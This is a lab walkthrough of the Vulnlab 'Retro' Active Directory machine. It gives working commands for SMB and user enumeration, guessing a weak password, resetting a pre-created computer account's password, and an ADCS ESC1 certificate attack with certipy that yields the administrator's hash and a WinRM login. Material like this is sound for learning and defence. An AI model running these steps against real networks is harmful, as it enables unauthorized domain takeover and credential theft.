# Vulnlab - Retro

## NMAP

```bash
PORT      STATE SERVICE    VERSION          
53/tcp    open  tcpwrapped
88/tcp open  kerberos-sec Microsoft Windows Kerberos
135/tcp   open  tcpwrapped                      
139/tcp   open  tcpwrapped                           
445/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped      
636/tcp   open  tcpwrapped
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Issuer: commonName=retro-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-23T21:06:31
| Not valid after:  2024-07-22T21:06:31
| MD5:   c1f0bac716e071c2bcb943273d569612
|_SHA-1: 7f37ea6965982430f9180a65bcadde76add6fea6
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=DC.retro.vl
| Issuer: commonName=DC.retro.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-25T09:53:42
| Not valid after:  2024-01-24T09:53:42
| MD5:   89ccbcee0485b170bbd1ebee3de93784
|_SHA-1: 2bfca683288bc59e2d2f9ffe01775d871c8c272d
9389/tcp  open  tcpwrapped
49664/tcp open  tcpwrapped
49672/tcp open  tcpwrapped
49683/tcp open  tcpwrapped
49708/tcp open  tcpwrapped
```

On Enumerating SMB with null authentication we can find few shares

<img src="https://i.imgur.com/hsCNCzc.png"/>

From the `Trainees` share, we'll get `Important.txt` which talks about having weak passwords on the trainees account and also mentions about bundling all of their account into one general `trainee` account

<img src="https://i.imgur.com/KSVl5Ad.png"/>

So verifying if the account is trainee through `kebrute`

```bash
kerbrute userenum --dc 10.10.108.245 -d retro.vl user.txt
```

<img src="https://i.imgur.com/qc50pOw.png"/>

We could have figured this out without guessing as well through lookupsid.py from impacket with anonymous user

```bash
lookupsid.py anonymous@10.10.99.152 -no-pass
```

<img src="https://i.imgur.com/OpoCNLA.png"/>

Since this account has a weak password, we can try common things like password being trainee, verifying it through `crackmapexec`

```bash
cme smb 10.10.99.152 -u 'trainee' -p 'trainee' --shares
```

<img src="https://i.imgur.com/652HK94.png"/>

We can now access `Notes` share and find a ToDo.txt file which talks about pre-created computer accounts 

<img src="https://i.imgur.com/mEc0UR2.png"/>

<img src="https://i.imgur.com/ZRsMc7m.png"/>
https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/

If we go back to the output of lookupsid, we'll see a computer account `BANKING$`

<img src="https://i.imgur.com/vZMirvK.png"/>
The password for this account is the same as the name, on trying to login, it will show `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`

<img src="https://i.imgur.com/EQuQGaE.png"/>

In order to use this account, we need to change the password and this can be done through `kpasswd` which requires `/etc/krb.conf` to be modified

<img src="https://i.imgur.com/XVq9dTs.png"/>

```
kpasswd BANKING$
```

<img src="https://i.imgur.com/XzyJKT4.png"/>

This can be verified again with cme that the password has been changed

<img src="https://i.imgur.com/4WqhYDX.png"/>

Enumerating ADCS with `certipy` , we see that authenticated users have enrollment rights but there isn't any template which be used with trainee user

<img src="https://i.imgur.com/Dn2l9l4.png"/>

However checking the BANKING$ account, there's a template `RetroClients` on which domain computer have enrollment rights which can allow the machine accounts to enroll certificate on behalf of other users leading to ESC1 attack 

```bash
certipy find -u 'BANKING$' -p 'Pass' -dc-ip 10.10.99.152 -stdout -vulnerable
```

<img src="https://i.imgur.com/4N8TaGP.png"/>

On requesting administrator's certificate, it's going to show an error that it doesn't meet the minimum key size which by default certipy sends with 2048 length

<img src="https://i.imgur.com/iVIZR00.png"/>

Specifying the key size to be of 4096 will resolve this issue

```bash
certipy req -u 'banking$'@retro.vl -p 'P@ss12345' -c 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator' -key-size 4096 
```

<img src="https://i.imgur.com/Z8njyv9.png"/>

With this certificate, administrator's hash can be retrieved

```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.99.152
```

<img src="https://i.imgur.com/uOMiJ0s.png"/>

Through `evil-winrm` we can login on WinRM using the NThash of administrator 

<img src="https://i.imgur.com/eDwld0C.png"/>
## References 

- https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/
